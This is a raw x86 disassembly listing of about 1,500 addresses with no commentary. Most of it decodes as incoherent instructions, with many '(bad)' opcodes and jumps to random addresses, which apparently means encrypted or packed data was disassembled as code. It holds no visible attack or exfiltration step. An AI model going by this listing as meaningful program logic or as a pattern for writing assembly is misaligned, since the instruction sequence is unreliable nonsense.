  411890:	out    0x73,al
  411892:	mov    esi,0x67bc4338
  411897:	pop    ebp
  411898:	sahf   
  411899:	mov    cs,WORD PTR [edx-0x20]
  41189c:	or     dh,ah
  41189e:	inc    esp
  41189f:	cmp    al,0x29
  4118a1:	and    bh,al
  4118a3:	pop    ds
  4118a4:	imul   esp,DWORD PTR [eax+0x38de8b00],0xb
  4118ab:	addr16 push ds
  4118ad:	addr16 jbe 0x411921
  4118b0:	(bad)  
  4118b1:	cld    
  4118b2:	call   0x9217af47
  4118b7:	leave  
  4118b8:	outs   dx,DWORD PTR ds:[esi]
  4118b9:	cmc    
  4118ba:	(bad)  
  4118bb:	fidiv  DWORD PTR [edi]
  4118bd:	fs fadd st,st(2)
  4118c0:	push   ecx
  4118c1:	in     eax,dx
  4118c2:	enter  0x5b95,0x3d
  4118c6:	repz (bad) 
  4118c8:	push   ebx
  4118c9:	pop    ds
  4118ca:	div    DWORD PTR [esi]
  4118cc:	push   ecx
  4118cd:	add    BYTE PTR [ebp+0x6db18a95],dl
  4118d3:	shr    DWORD PTR [ebp-0x51],1
  4118d6:	pop    edi
  4118d7:	jmp    0xd4f8774a
  4118dc:	adc    al,0xc
  4118de:	push   cs
  4118df:	jo     0x411863
  4118e1:	push   ebp
  4118e2:	jecxz  0x4118ab
  4118e4:	lds    esp,FWORD PTR [esi-0x799ee4fa]
  4118ea:	pop    ebx
  4118eb:	imul   esi,DWORD PTR [edx-0x2d9bc5a0],0x712fc4bf
  4118f5:	jle    0x4118b5
  4118f7:	lods   eax,DWORD PTR ds:[esi]
  4118f8:	fnstenv [edi-0x26]
  4118fb:	outs   dx,DWORD PTR ds:[esi]
  4118fc:	jb     0x4118be
  4118fe:	mov    esp,0x46b4032b
  411903:	jns    0x4118ba
  411905:	nop
  411906:	daa    
  411907:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411908:	(bad)  
  411909:	iret   
  41190a:	and    bh,0xc1
  41190d:	mov    ch,dl
  41190f:	retf   0xaf2e
  411912:	das    
  411913:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411914:	out    0x4c,eax
  411916:	ror    DWORD PTR [esi-0x10],1
  411919:	loopne 0x411908
  41191b:	shl    bh,1
  41191d:	es sahf 
  41191f:	mov    bh,BYTE PTR [eax+0x3e2cead5]
  411925:	pop    eax
  411926:	inc    esp
  411927:	xchg   esi,eax
  411928:	push   ebp
  411929:	add    ah,dl
  41192b:	outs   dx,BYTE PTR ds:[esi]
  41192c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41192d:	lahf   
  41192e:	adc    eax,0xb8e96f2d
  411933:	xor    bl,ah
  411935:	jns    0x411944
  411937:	xchg   esp,eax
  411938:	dec    edx
  411939:	and    bh,BYTE PTR [ebp+0x79d0d684]
  41193f:	mov    ecx,0xeb050e71
  411944:	daa    
  411945:	xlat   BYTE PTR ds:[ebx]
  411946:	push   esp
  411947:	jmp    0x41195b
  411949:	mov    esi,0x24da6dd5
  41194e:	das    
  41194f:	hlt    
  411950:	and    edx,DWORD PTR [esi+0x1f]
  411953:	aam    0xcf
  411955:	sbb    dh,al
  411957:	and    DWORD PTR [eax],edi
  411959:	mov    BYTE PTR [edx],dh
  41195b:	adc    ebx,ebp
  41195d:	xchg   edx,eax
  41195e:	xchg   ebp,eax
  41195f:	fiadd  DWORD PTR [ebx+0x29969d3e]
  411966:	cmp    esp,edx
  411968:	(bad)  
  411969:	call   esi
  41196b:	cmp    bl,BYTE PTR ds:0x806eac2c
  411971:	sub    al,0xaa
  411973:	js     0x4118f5
  411975:	lea    ebx,[esi+0x16]
  411978:	and    BYTE PTR [ecx-0x27fd70f2],al
  41197e:	mov    ebx,0x7ddc3dbe
  411983:	jmp    0x411975
  411985:	mov    esi,0xa8f5e76f
  41198a:	adc    eax,0xdd2e6252
  41198f:	and    al,BYTE PTR es:[ebp-0x27]
  411993:	inc    eax
  411994:	mov    ebx,0xe14b6a0
  411999:	mov    dh,0x99
  41199b:	push   es
  41199c:	mov    eax,0xb68f327d
  4119a1:	inc    edi
  4119a2:	push   ebp
  4119a3:	adc    eax,0xbf6816b7
  4119a8:	cld    
  4119a9:	dec    edi
  4119aa:	lock pop es
  4119ac:	jno    0x411970
  4119ae:	adc    al,BYTE PTR [edx+0x2004e526]
  4119b4:	sub    bl,BYTE PTR [ebx+0x70]
  4119b7:	mov    esp,0x8e0ddf4a
  4119bc:	test   eax,0xb956fc07
  4119c1:	lock pushw 0x66
  4119c5:	dec    ecx
  4119c6:	fistp  DWORD PTR [ebx]
  4119c8:	loopne 0x411995
  4119ca:	scas   eax,DWORD PTR es:[edi]
  4119cb:	(bad)  
  4119cc:	sub    edx,DWORD PTR [ecx-0x48d4a987]
  4119d2:	push   0xf5e8a161
  4119d7:	lock jno 0x411992
  4119da:	sub    cl,cl
  4119dc:	pop    edx
  4119dd:	rol    DWORD PTR [ebx+0x33],1
  4119e0:	mov    ah,0x3e
  4119e2:	sub    ch,BYTE PTR [esi-0x46]
  4119e5:	jne    0x411a14
  4119e7:	sti    
  4119e8:	in     eax,0xda
  4119ea:	add    DWORD PTR [esi],esi
  4119ec:	xor    eax,0x83f0be3d
  4119f1:	fisttp DWORD PTR [esi-0x3b19b13]
  4119f7:	(bad)  
  4119f8:	cmp    cl,ch
  4119fa:	ror    BYTE PTR ds:0xd528251a,cl
  411a00:	sub    al,0x82
  411a02:	cli    
  411a03:	out    dx,al
  411a04:	jecxz  0x411a84
  411a06:	sub    BYTE PTR [ebx+0x1f],al
  411a09:	pushf  
  411a0a:	arpl   WORD PTR [esi-0x53],ax
  411a0d:	and    DWORD PTR [edi+ebx*8],eax
  411a10:	xchg   esi,eax
  411a11:	popa   
  411a12:	jle    0x411a24
  411a14:	xchg   edi,eax
  411a15:	scas   eax,DWORD PTR es:[edi]
  411a16:	adc    eax,DWORD PTR [ecx+0x2278f93a]
  411a1c:	lods   al,BYTE PTR ds:[esi]
  411a1d:	sbb    DWORD PTR [esi-0x3cb245a4],edx
  411a23:	pop    ebx
  411a24:	fisub  WORD PTR [edi]
  411a26:	jae    0x411a4a
  411a28:	icebp  
  411a29:	(bad)  
  411a2a:	lods   al,BYTE PTR ds:[esi]
  411a2b:	add    DWORD PTR [ecx+0x75],0x42
  411a2f:	sub    eax,0x65948360
  411a34:	test   al,0x20
  411a36:	ja     0x4119e0
  411a38:	enter  0xae3a,0xe9
  411a3c:	nop
  411a3d:	and    eax,0x5c45d113
  411a42:	enter  0xbb7f,0x3a
  411a46:	mov    al,0x7
  411a48:	add    BYTE PTR es:0xa2dcd5da,bl
  411a4f:	xchg   ecx,eax
  411a50:	fwait
  411a51:	stos   DWORD PTR es:[edi],eax
  411a52:	pop    eax
  411a53:	in     eax,0x26
  411a55:	sub    DWORD PTR [eax-0x76],ebx
  411a58:	int3   
  411a59:	call   0x760f:0x333a74aa
  411a60:	inc    ecx
  411a61:	push   esi
  411a62:	sar    edx,0xda
  411a65:	jg     0x411a92
  411a67:	add    eax,0x4911befe
  411a6c:	idiv   bh
  411a6e:	jmp    0x411a3e
  411a70:	xchg   esi,eax
  411a71:	inc    eax
  411a72:	aad    0x23
  411a74:	lods   al,BYTE PTR ds:[esi]
  411a75:	cli    
  411a76:	add    ecx,ebx
  411a78:	push   cs
  411a79:	test   eax,0x59ff1fc4
  411a7e:	push   ds
  411a7f:	and    BYTE PTR [esp+edi*8-0x80],ch
  411a83:	add    BYTE PTR [eax],ch
  411a85:	fs mov eax,0xc0c66b6
  411a8b:	xchg   ebx,eax
  411a8c:	in     eax,0xb5
  411a8e:	inc    ecx
  411a8f:	jmp    0x411aa8
  411a91:	mov    edx,0x46b6ced
  411a96:	jle    0x411a1f
  411a98:	and    edi,DWORD PTR [esi+0x31]
  411a9b:	pop    ebp
  411a9c:	outs   dx,DWORD PTR ds:[esi]
  411a9d:	lahf   
  411a9e:	and    BYTE PTR [edx],bh
  411aa0:	and    al,BYTE PTR [ebx-0x7f]
  411aa3:	clc    
  411aa4:	pop    edi
  411aa5:	fwait
  411aa6:	cs out 0x63,eax
  411aa9:	cmc    
  411aaa:	sub    edi,ebp
  411aac:	daa    
  411aad:	xchg   BYTE PTR [edx+esi*2+0x7a],bh
  411ab1:	scas   eax,DWORD PTR es:[edi]
  411ab2:	sbb    al,0xb4
  411ab4:	retf   0x9e85
  411ab7:	test   BYTE PTR [ebx-0x61dca63e],0xa9
  411abe:	ret    0x8a08
  411ac1:	adc    ecx,DWORD PTR [edx+edx*1-0x2fa53503]
  411ac8:	sub    BYTE PTR ds:[esi+0x4d],ch
  411acc:	retf   0x21a1
  411acf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ad0:	xchg   bh,bl
  411ad2:	rcr    DWORD PTR [ecx-0x6f2221d9],cl
  411ad8:	inc    ebp
  411ad9:	pop    ecx
  411ada:	and    dh,BYTE PTR [eax-0x1a]
  411add:	inc    esi
  411ade:	jns    0x411b56
  411ae0:	repz mov ch,0x6f
  411ae3:	int    0x26
  411ae5:	bound  ebp,QWORD PTR [ecx+0x42]
  411ae8:	sti    
  411ae9:	adc    eax,0xc99ff126
  411aee:	or     ebp,esi
  411af0:	jns    0x411a7b
  411af2:	(bad)  
  411af3:	mov    edi,0x56c7a3cd
  411af8:	sbb    ch,ch
  411afa:	pslld  mm0,QWORD PTR [esi+0x6c24184a]
  411b01:	cmp    DWORD PTR [edx-0x65a57812],edx
  411b07:	cmp    dh,ah
  411b09:	js     0x411b41
  411b0b:	jle    0x411abc
  411b0d:	out    0xe8,al
  411b0f:	jb     0x411abe
  411b11:	les    esp,FWORD PTR [ecx+0x6579494c]
  411b17:	out    0xb9,al
  411b19:	in     eax,0x1b
  411b1b:	das    
  411b1c:	inc    ecx
  411b1d:	pop    esp
  411b1e:	popf   
  411b1f:	rcl    BYTE PTR [esi+eax*1-0x41975c91],1
  411b26:	sbb    DWORD PTR [ecx-0x1c789d51],esi
  411b2c:	push   ecx
  411b2e:	aaa    
  411b2f:	push   ecx
  411b30:	xor    al,0x77
  411b32:	popf   
  411b33:	enter  0x8fd0,0x52
  411b37:	pop    eax
  411b38:	das    
  411b39:	and    ebp,0x372472a2
  411b3f:	cld    
  411b40:	lea    eax,[edi+0x24]
  411b43:	sbb    eax,0x24d8c9ce
  411b48:	dec    ecx
  411b49:	mov    cl,0x89
  411b4b:	sti    
  411b4c:	scas   al,BYTE PTR es:[edi]
  411b4d:	not    BYTE PTR [ebp+0x1da6f955]
  411b53:	int3   
  411b54:	and    DWORD PTR [edx],esi
  411b56:	and    eax,0xb6179ce0
  411b5b:	out    dx,al
  411b5c:	(bad)  
  411b5d:	ret    
  411b5e:	inc    edi
  411b5f:	push   es
  411b60:	push   ss
  411b61:	pop    ebp
  411b62:	popf   
  411b63:	sbb    al,0xe0
  411b65:	fisttp WORD PTR [ecx-0x75]
  411b68:	adc    cl,BYTE PTR [edi+edi*1-0x1a4196b3]
  411b6f:	(bad)  
  411b70:	pop    eax
  411b71:	push   ss
  411b72:	pop    ecx
  411b73:	jnp    0x411af7
  411b75:	jecxz  0x411b2e
  411b77:	xor    eax,0xb6524612
  411b7c:	cdq    
  411b7d:	dec    ebx
  411b7e:	and    DWORD PTR ds:0x1f0540d8,esi
  411b84:	mov    esi,0xf9d270a4
  411b89:	sub    edx,ebp
  411b8b:	or     eax,0x4356ca56
  411b90:	(bad)
  411b93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b94:	xchg   BYTE PTR [edi-0x27],ch
  411b97:	cs cs icebp 
  411b9a:	int    0xa7
  411b9c:	pushf  
  411b9d:	or     cl,BYTE PTR [ebp+0x11]
  411ba0:	sub    ebp,DWORD PTR [eax-0x2abc457d]
  411ba6:	and    bl,BYTE PTR [esi-0x4a943fc6]
  411bac:	or     eax,0x9dc1645
  411bb1:	xchg   esp,eax
  411bb2:	jno    0x411b9e
  411bb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bb5:	jbe    0x411bcc
  411bb7:	sti    
  411bb8:	xchg   ebx,eax
  411bb9:	xchg   edi,eax
  411bba:	iret   
  411bbb:	sub    BYTE PTR [ebx+0x33],ch
  411bbe:	or     al,0xee
  411bc0:	dec    esi
  411bc1:	(bad)  
  411bc2:	add    DWORD PTR [edi-0x200052fd],0x656b48ca
  411bcc:	aaa    
  411bcd:	call   0x877c:0xbe1a4a6d
  411bd4:	jl     0x411c00
  411bd6:	std    
  411bd7:	loop   0x411c1d
  411bd9:	xor    al,0xef
  411bdb:	loope  0x411bd1
  411bdd:	mov    cl,0xff
  411bdf:	sub    cl,BYTE PTR [edx-0x3e]
  411be2:	jnp    0x411c5c
  411be4:	mov    cl,0x8a
  411be7:	call   0x6b09f7c0
  411bec:	dec    esi
  411bed:	shr    DWORD PTR [edx],cl
  411bef:	dec    edi
  411bf0:	jmp    0x59dd:0xec0e5d6e
  411bf7:	and    DWORD PTR [ebx-0x4d],ecx
  411bfa:	xchg   ebx,eax
  411bfb:	stc    
  411bfc:	jmp    0x411b93
  411bfe:	cmp    dl,BYTE PTR [ecx+0x11855bc]
  411c04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c05:	jge    0x411c3f
  411c07:	push   edi
  411c08:	stos   DWORD PTR es:[edi],eax
  411c09:	lds    ebp,FWORD PTR [ebp+ecx*8-0x45c86c8d]
  411c10:	nop
  411c11:	stos   DWORD PTR es:[edi],eax
  411c12:	in     eax,dx
  411c13:	cli    
  411c14:	mov    esp,0x90677cf2
  411c19:	lods   al,BYTE PTR ds:[esi]
  411c1a:	loope  0x411c78
  411c1c:	pop    es
  411c1d:	mov    gs,esi
  411c1f:	mov    edx,0x2e3a3058
  411c24:	nop
  411c25:	ins    BYTE PTR es:[edi],dx
  411c26:	adc    ebx,ebp
  411c28:	or     BYTE PTR [ebp-0x73],bh
  411c2b:	add    esp,DWORD PTR [ebp-0x7]
  411c2e:	inc    edx
  411c2f:	rcl    BYTE PTR [ecx+0x79],0x13
  411c33:	lea    ecx,[eax]
  411c35:	fwait
  411c36:	aam    0xd7
  411c38:	mov    bl,0x42
  411c3a:	leave  
  411c3b:	imul   eax,DWORD PTR [edi-0x1996afd5],0xffffffe4
  411c42:	mov    ds:0x8bad8604,al
  411c47:	cmp    eax,0x5c862cc9
  411c4c:	in     eax,0x72
  411c4e:	out    0x50,eax
  411c50:	or     al,bl
  411c52:	add    BYTE PTR [eax+0x26],0xb0
  411c56:	test   BYTE PTR [ecx],bl
  411c58:	loop   0x411bfc
  411c5a:	cmp    al,0x6c
  411c5c:	jns    0x411cdd
  411c5e:	jns    0x411c3f
  411c60:	addr16 aam 0x9c
  411c63:	mov    ds:0xb41f310a,al
  411c68:	bound  edi,QWORD PTR [edx+0xe]
  411c6b:	xchg   ecx,eax
  411c6c:	mov    al,ds:0x41b22ca1
  411c71:	add    BYTE PTR [ebx],al
  411c73:	add    eax,0x41b224
  411c78:	jmp    0x411c84
  411c7d:	mov    eax,DWORD PTR [ebp+0xc]
  411c80:	xor    eax,ecx
  411c82:	add    eax,edx
  411c84:	mov    ds:0x41b224,eax
  411c89:	mov    eax,DWORD PTR [ebp+0xc]
  411c8c:	xor    eax,ecx
  411c8e:	add    eax,edx
  411c90:	mov    ds:0x41b22c,eax
  411c95:	jmp    0x4120a9
  411c9a:	mov    eax,ds:0x41b22c
  411c9f:	mov    ds:0x41b224,eax
  411ca4:	jmp    0x4120a9
  411ca9:	mov    dh,0x72
  411cab:	cwde   
  411cac:	test   al,0x64
  411cae:	jb     0x411c66
  411cb0:	jb     0x411ca3
  411cb2:	xchg   ecx,eax
  411cb3:	adc    eax,0xc0d6a65e
  411cb8:	jmp    0x70b1701b
  411cbd:	pop    eax
  411cbe:	jge    0x411d30
  411cc0:	jo     0x411d30
  411cc2:	jbe    0x411d1a
  411cc4:	and    BYTE PTR [eax+0x47],ch
  411cc7:	fwait
  411cc8:	xor    al,0x41
  411cca:	pop    eax
  411ccb:	sbb    ah,dh
  411ccd:	cwde   
  411cce:	clc    
  411ccf:	ficomp WORD PTR [eax+0x63b9deba]
  411cd5:	fwait
  411cd6:	in     al,dx
  411cd7:	or     eax,0xa5fd48
  411cdc:	add    ah,BYTE PTR [ecx]
  411cde:	cmp    BYTE PTR [eax+0x78],dh
  411ce1:	addr16 icebp 
  411ce3:	dec    ebx
  411ce4:	push   ss
  411ce5:	adc    dh,BYTE PTR [edx]
  411ce7:	in     al,dx
  411ce8:	jecxz  0x411d69
  411cea:	rcl    eax,0x1e
  411ced:	push   ecx
  411cee:	push   cs
  411cef:	xor    BYTE PTR [ecx+0x26],ah
  411cf2:	jle    0x411d07
  411cf4:	jmp    0xde15:0x42dcf966
  411cfb:	pop    edx
  411cfc:	aas    
  411cfd:	xchg   ebx,eax
  411cfe:	mov    edi,0xcde9e435
  411d03:	sub    DWORD PTR [edi+0x129148f9],ebp
  411d09:	add    ah,BYTE PTR [ebp+0xf86721f]
  411d0f:	jae    0x411ce0
  411d11:	fistp  QWORD PTR [esi]
  411d13:	into   
  411d14:	ss (bad) 
  411d16:	jns    0x411ccc
  411d18:	outs   dx,BYTE PTR ds:[esi]
  411d19:	xlat   BYTE PTR ds:[ebx]
  411d1a:	fdivrp st(3),st
  411d1c:	push   0x2726bd16
  411d21:	bound  esi,QWORD PTR [ecx+eiz*1-0x21208dd0]
  411d28:	cli    
  411d29:	jge    0x411cb4
  411d2b:	cmc    
  411d2c:	in     eax,0xf6
  411d2e:	inc    esp
  411d2f:	fdivr  QWORD PTR [esp+ebx*2+0x17]
  411d33:	dec    edi
  411d34:	retf   
  411d35:	add    DWORD PTR [edi+0x2c],ecx
  411d38:	arpl   WORD PTR [esi],ax
  411d3a:	or     al,0x64
  411d3c:	pop    ecx
  411d3d:	xor    DWORD PTR [ecx+0x21],0x4b
  411d41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d42:	out    dx,al
  411d43:	mov    ch,0xdc
  411d45:	xor    eax,0x7752116f
  411d4a:	outs   dx,DWORD PTR ds:[esi]
  411d4b:	neg    BYTE PTR [edx+0x62]
  411d4e:	mov    ebp,0xe65e4f32
  411d53:	fcomp  DWORD PTR [esi-0x2]
  411d56:	sub    al,0x8d
  411d58:	jnp    0x411cfe
  411d5a:	ret    
  411d5b:	fidivr WORD PTR [edi-0x375bf430]
  411d61:	push   cs
  411d62:	sub    eax,0x65b25307
  411d67:	add    ch,BYTE PTR [edi-0x578c3035]
  411d6d:	out    0xcd,eax
  411d6f:	dec    ebx
  411d70:	in     al,0x59
  411d72:	lahf   
  411d73:	mov    eax,ds:0x9364616a
  411d78:	fsubr  DWORD PTR [edx+edx*2+0x29]
  411d7c:	xchg   ecx,eax
  411d7d:	mov    al,ds:0xdd3c3135
  411d82:	fisttp DWORD PTR [eax+0x606caaba]
  411d88:	or     BYTE PTR [eax-0x21f622b1],bh
  411d8e:	in     al,0x19
  411d90:	jns    0x411dae
  411d92:	je     0x411e01
  411d94:	xchg   ebx,eax
  411d95:	pop    ds
  411d96:	out    0x52,eax
  411d98:	dec    ecx
  411d99:	icebp  
  411d9a:	arpl   cx,di
  411d9c:	(bad)  
  411d9d:	rcr    BYTE PTR [ebx],cl
  411d9f:	neg    BYTE PTR [edi+0x22]
  411da2:	mov    esp,0x84f1e95e
  411da7:	push   esp
  411da8:	nop
  411da9:	and    BYTE PTR [esi],dl
  411dab:	sub    al,0xa0
  411dad:	pop    ecx
  411dae:	mov    WORD PTR [ecx],gs
  411db0:	pop    edi
  411db1:	cwde   
  411db2:	loop   0x411e0d
  411db4:	leave  
  411db5:	leave  
  411db6:	mov    eax,ds:0x350496c5
  411dbb:	sbb    al,0xe9
  411dbd:	fsubr  QWORD PTR [edi+0x2c6d546e]
  411dc3:	ret    
  411dc4:	outs   dx,BYTE PTR ds:[esi]
  411dc5:	sub    eax,0x9297970b
  411dca:	cmp    DWORD PTR [ecx+0x41c4b50d],0x16
  411dd1:	sub    ebx,DWORD PTR [ecx]
  411dd3:	jb     0x411e1d
  411dd5:	adc    al,0xe1
  411dd7:	in     eax,0xcd
  411dd9:	inc    esp
  411dda:	loop   0x411d78
  411ddc:	add    eax,0x58716eea
  411de1:	adc    eax,0x2b9a983e
  411de6:	clc    
  411de7:	lea    esp,[edi-0x47]
  411dea:	pop    esi
  411deb:	(bad)  
  411dec:	pop    ds
  411ded:	cmp    ch,0x9b
  411df0:	ret    
  411df1:	mov    dl,0x61
  411df3:	mov    eax,ds:0x250ea493
  411df8:	or     BYTE PTR [edx+edi*8+0x74],bl
  411dfc:	out    dx,al
  411dfd:	push   edx
  411dfe:	or     DWORD PTR [edi],edx
  411e00:	stos   DWORD PTR es:[edi],eax
  411e01:	sub    esi,eax
  411e03:	enter  0x1c5f,0x80
  411e07:	into   
  411e08:	enter  0x6ba,0xf8
  411e0c:	mov    ds:0x9c4411cf,eax
  411e11:	gs sub eax,0x7c12edb0
  411e17:	dec    esi
  411e18:	into   
  411e19:	(bad)  
  411e1a:	call   0x120c:0xe49a3c91
  411e21:	sub    al,bh
  411e23:	cmp    BYTE PTR [esi+0x46],dh
  411e26:	add    edi,DWORD PTR [edi]
  411e28:	into   
  411e29:	xor    al,0xc1
  411e2b:	xor    BYTE PTR [ecx],al
  411e2d:	rol    BYTE PTR [eax],cl
  411e2f:	mov    al,ds:0xe53fc992
  411e34:	pop    edx
  411e35:	cs retf 
  411e37:	inc    ecx
  411e38:	popf   
  411e39:	dec    esi
  411e3a:	adc    al,0x45
  411e3c:	fstp   TBYTE PTR [edx]
  411e3e:	pop    DWORD PTR ds:0xca13acbd
  411e44:	pop    ecx
  411e45:	jb     0x411e6f
  411e47:	or     DWORD PTR [edi+0x33],esi
  411e4a:	mov    esi,0x9cd676fd
  411e4f:	inc    edi
  411e50:	test   BYTE PTR gs:0x2bd32edf,0x80
  411e58:	daa    
  411e59:	cmp    BYTE PTR [edi+ebx*8-0x6bb4f4e1],0x10
  411e61:	out    0x3e,al
  411e63:	add    edx,esi
  411e65:	outs   dx,BYTE PTR ds:[esi]
  411e66:	mov    ebx,0x4ff87986
  411e6b:	add    eax,0x8ebeee28
  411e70:	fidivr WORD PTR [ebx+0x277fdcb0]
  411e76:	inc    edi
  411e77:	hlt    
  411e78:	xchg   ecx,eax
  411e79:	sbb    eax,0x485d7ef7
  411e7e:	fcom   st(2)
  411e80:	shl    ebx,1
  411e82:	addr16 adc al,0x1e
  411e85:	jae    0x411ecc
  411e87:	pop    edx
  411e88:	sub    eax,0xf2e86da9
  411e8d:	das    
  411e8e:	xchg   edx,eax
  411e8f:	cmp    esp,DWORD PTR [edx-0x4667d74f]
  411e95:	arpl   WORD PTR [esi+0x55],sp
  411e98:	mov    esi,?
  411e9a:	push   ds
  411e9b:	or     ebp,DWORD PTR [ebx+0x5610f88a]
  411ea1:	scas   al,BYTE PTR es:[edi]
  411ea2:	jg     0x411eda
  411ea4:	or     al,0xc8
  411ea6:	or     al,0xb1
  411ea8:	test   BYTE PTR [edx-0x6a1aa094],dh
  411eae:	jbe    0x411eea
  411eb0:	mov    ebx,0x4e69873a
  411eb5:	fcmovb st,st(4)
  411eb7:	dec    esi
  411eb8:	(bad)  
  411eba:	adc    ebp,ebp
  411ebc:	jecxz  0x411e8f
  411ebe:	fiadd  DWORD PTR [esp+eax*1+0x3c8bb02a]
  411ec5:	mov    esp,0x675651f7
  411eca:	jbe    0x411e6d
  411ecc:	fdiv   QWORD PTR [eax-0x520e8754]
  411ed2:	fisub  DWORD PTR [ebx+0x71]
  411ed5:	xor    ch,al
  411ed7:	fist   DWORD PTR [edx+0x31]
  411eda:	imul   esi,DWORD PTR [esi+eiz*2-0x4e],0xffffffd1
  411edf:	cdq    
  411ee0:	lods   eax,DWORD PTR ds:[esi]
  411ee1:	xchg   ebx,eax
  411ee2:	outs   dx,BYTE PTR ds:[esi]
  411ee3:	imul   edx,esp,0xffffffb4
  411ee6:	mov    BYTE PTR [ebp-0x1d],dl
  411ee9:	scas   eax,DWORD PTR es:[edi]
  411eea:	xchg   ebx,eax
  411eeb:	loope  0x411eb3
  411eed:	push   ebp
  411eee:	push   esi
  411eef:	ds pop ss
  411ef1:	push   0x1da4e73f
  411ef6:	jbe    0x411ea5
  411ef8:	dec    edi
  411ef9:	xchg   edx,eax
  411efa:	pop    edi
  411efb:	mov    ecx,0x2299b5d3
  411f00:	dec    ebp
  411f01:	leave  
  411f02:	lea    ecx,[edi-0x3ca541e2]
  411f08:	mov    eax,0xb0889e95
  411f0d:	in     eax,dx
  411f0e:	jns    0x411f05
  411f10:	sub    eax,0xa4b7cfdf
  411f15:	test   DWORD PTR [ebx],0xc2b6669f
  411f1b:	dec    edx
  411f1c:	cmp    al,0xb8
  411f1e:	pop    esp
  411f1f:	or     BYTE PTR [ebx+0x7f],dh
  411f22:	loop   0x411edc
  411f24:	xor    DWORD PTR ds:0x806363a9,ebp
  411f2a:	jg     0x411f95
  411f2c:	stc    
  411f2d:	(bad)  
  411f2e:	ins    DWORD PTR es:[edi],dx
  411f2f:	and    BYTE PTR [ecx+eiz*1+0xb],ah
  411f33:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  411f35:	jge    0x411f20
  411f37:	adc    al,0x9b
  411f39:	mov    esi,DWORD PTR [eax+0x154dd5ee]
  411f3f:	mov    al,ds:0x218b5d36
  411f44:	in     eax,dx
  411f45:	mov    ah,BYTE PTR [ecx-0x47]
  411f48:	mov    ds:0x6bebdeaa,al
  411f4d:	call   0xb9f95a07
  411f52:	xchg   edx,eax
  411f53:	test   dl,ah
  411f55:	add    edx,DWORD PTR [ebx-0x44]
  411f58:	adc    edx,DWORD PTR [ecx-0x78]
  411f5b:	in     eax,dx
  411f5c:	sub    ah,BYTE PTR [edi]
  411f5e:	inc    esp
  411f5f:	enter  0xb7bc,0x8a
  411f63:	add    bh,BYTE PTR [ebp-0x30]
  411f66:	inc    edx
  411f67:	adc    eax,0x39bd5302
  411f6c:	iret   
  411f6d:	push   ebx
  411f6e:	(bad)  
  411f6f:	shl    bh,cl
  411f71:	imul   ebx,ebx,0x490f96b9
  411f77:	or     al,0x8b
  411f79:	inc    ecx
  411f7a:	cmp    eax,0xe0b2789e
  411f7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f80:	xchg   esi,eax
  411f81:	mov    ds:0xcb9a2920,al
  411f86:	aad    0x1e
  411f88:	lods   al,BYTE PTR ds:[esi]
  411f89:	lods   eax,DWORD PTR ds:[esi]
  411f8a:	mov    al,ds:0xb1a0997b
  411f8f:	add    bh,BYTE PTR [esi-0x48eae396]
  411f95:	inc    edx
  411f96:	xor    BYTE PTR [esi-0x7c],al
  411f99:	jp     0x411fc7
  411f9b:	scas   eax,DWORD PTR es:[edi]
  411f9c:	(bad)  
  411f9d:	xor    eax,0x870f6fef
  411fa2:	fidiv  WORD PTR [ebx]
  411fa4:	ins    DWORD PTR es:[edi],dx
  411fa5:	fs xchg esp,eax
  411fa7:	xchg   ebp,eax
  411fa8:	hlt    
  411fa9:	and    eax,0xa211a98
  411fae:	xor    al,0x1c
  411fb0:	fmulp  st(1),st
  411fb2:	int3   
  411fb3:	mov    esi,0x48b37a89
  411fb8:	call   0x3ecb:0x44282fca
  411fbf:	mov    ch,BYTE PTR [edi-0x4536b365]
  411fc5:	mov    ebx,0x2e44c638
  411fca:	dec    edx
  411fcb:	push   eax
  411fcc:	push   eax
  411fcd:	inc    edi
  411fce:	push   0x1f7507ce
  411fd3:	mov    ?,WORD PTR [esi+0x14d7de68]
  411fd9:	loopne 0x412052
  411fdb:	(bad)  
  411fdc:	add    eax,0x72acaec6
  411fe1:	pop    esi
  411fe2:	add    eax,0x66bee03
  411fe7:	aam    0x36
  411fe9:	mov    cl,0x69
  411feb:	cld    
  411fec:	sub    eax,0x1900e683
  411ff1:	repz mul BYTE PTR ss:[esi-0x592c9f19]
  411ff9:	es push cs
  411ffb:	add    cl,dl
  411ffd:	aad    0xef
  411fff:	les    esi,FWORD PTR [ecx-0x2d13ddf4]
  412005:	xor    al,0x29
  412007:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412008:	dec    esi
  412009:	bound  esp,QWORD PTR ds:[edi-0x32]
  41200d:	popa   
  41200e:	pop    edx
  41200f:	sbb    bh,BYTE PTR [ecx-0x2f29c14]
  412015:	pop    esp
  412016:	and    esi,0x7308063e
  41201c:	push   0x23c765a8
  412021:	popa   
  412022:	inc    esi
  412023:	adc    BYTE PTR [edx],dl
  412025:	adc    dl,BYTE PTR [edi+0xfb29739]
  41202b:	icebp  
  41202c:	mov    ch,BYTE PTR [edi+0x4d974a8f]
  412032:	ds jecxz 0x411ffc
  412035:	addr16 hlt 
  412037:	mov    DWORD PTR [edx-0x71],ebp
  41203a:	out    0xa9,eax
  41203c:	call   0xbac0:0x14168ef0
  412043:	fdiv   QWORD PTR [edx+0x2d6cd526]
  412049:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41204a:	sbb    al,al
  41204c:	stos   DWORD PTR es:[edi],eax
  41204d:	test   al,0x41
  41204f:	cld    
  412050:	mov    bh,0x79
  412052:	mov    ds:0x23c64d74,eax
  412057:	ins    BYTE PTR es:[edi],dx
  412058:	iret   
  412059:	in     al,dx
  41205a:	je     0x41207c
  41205c:	fwait
  41205d:	push   cs
  41205e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41205f:	add    ah,BYTE PTR [edi+0x79]
  412062:	(bad)  
  412063:	and    ecx,esi
  412065:	jnp    0x412091
  412067:	ret    0x29c4
  41206a:	sbb    al,0x18
  41206c:	arpl   WORD PTR [edx],ax
  41206e:	out    dx,al
